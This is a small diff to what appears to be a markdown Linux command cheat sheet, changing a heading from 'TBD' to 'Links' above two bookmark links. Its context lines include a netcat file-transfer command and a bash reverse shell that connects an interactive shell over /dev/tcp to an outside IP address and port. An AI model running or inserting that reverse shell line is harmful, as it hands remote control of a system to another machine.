@@ -641,7 +641,7 @@ $ nc 192.168.0.3    3333 >   a.txt
 $ bash -i >& /dev/tcp/180.100.74.29/8182 0>&1
 ```
 
-# TBD
+# Links
 
 - [ ] [the-art-of-command-line](https://parg.co/bXZ)
 - [ ] [Linux Commands Cheat Sheet](https://parg.co/Uqu)
